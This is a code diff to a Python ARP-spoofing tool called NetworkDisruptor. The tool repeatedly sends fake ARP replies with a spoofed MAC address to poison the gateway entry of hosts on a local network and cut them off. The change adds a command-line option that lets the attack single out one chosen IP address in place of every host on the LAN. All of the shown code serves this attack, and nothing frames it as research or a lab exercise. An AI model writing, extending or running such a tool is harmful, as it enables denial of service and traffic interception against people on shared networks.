@@ -31,7 +31,8 @@ class InvalidMACError(ValueError):
     pass
 
 class NetworkDisruptor:
-    def __init__(self, fake_mac: Optional[str] = None, gateway_ip: Optional[str] = None, interface: Optional[str] = None):
+    def __init__(self, fake_mac: Optional[str] = None, gateway_ip: Optional[str] = None, 
+                 interface: Optional[str] = None, target_ip: Optional[str] = None):
         # Set up signal handling for graceful shutdown
         signal.signal(signal.SIGINT, self._signal_handler)
         signal.signal(signal.SIGTERM, self._signal_handler)
@@ -51,6 +52,9 @@ class NetworkDisruptor:
         
         # Set gateway IP
         self.gateway_ip = self._validate_ip(gateway_ip) if gateway_ip else self._get_default_gateway()
+        
+        # Set target IP if specified
+        self.target_ip = self._validate_ip(target_ip) if target_ip else None
         
         self.os_type = platform.system().lower()
         self.running = False
@@ -137,13 +141,22 @@ class NetworkDisruptor:
         self.logger.info(f"Using fake MAC: {self.fake_mac}")
         self.logger.info(f"Targeting gateway IP: {self.gateway_ip}")
         
+        if self.target_ip:
+            self.logger.info(f"Targeting specific IP: {self.target_ip}")
+        
         self.running = True
         try:
             while self.running:
-                targets = self._get_lan_targets()
-                for target_ip in targets:
-                    self._send_fake_arp(target_ip, self.fake_mac)
-                    self.targets.add(target_ip)  # Track affected targets
+                if self.target_ip:
+                    # Target single IP
+                    self._send_fake_arp(self.target_ip, self.fake_mac)
+                    self.targets.add(self.target_ip)
+                else:
+                    # Target all IPs on LAN
+                    targets = self._get_lan_targets()
+                    for target_ip in targets:
+                        self._send_fake_arp(target_ip, self.fake_mac)
+                        self.targets.add(target_ip)
                 time.sleep(2)
         except KeyboardInterrupt:
             self.logger.info("Disruption stopped by user")
@@ -269,6 +282,11 @@ def main():
         help="Network interface to use (optional)",
         default=None
     )
+    parser.add_argument(
+        "--target-ip",
+        help="Specific IP address to target (optional, will target all LAN IPs if not provided)",
+        default=None
+    )
     
     args = parser.parse_args()
     
@@ -276,7 +294,8 @@ def main():
         disruptor = NetworkDisruptor(
             fake_mac=args.fake_mac,
             gateway_ip=args.gateway_ip,
-            interface=args.interface
+            interface=args.interface,
+            target_ip=args.target_ip
         )
         disruptor.disrupt_network()
     except (NetworkError, ValueError) as e:
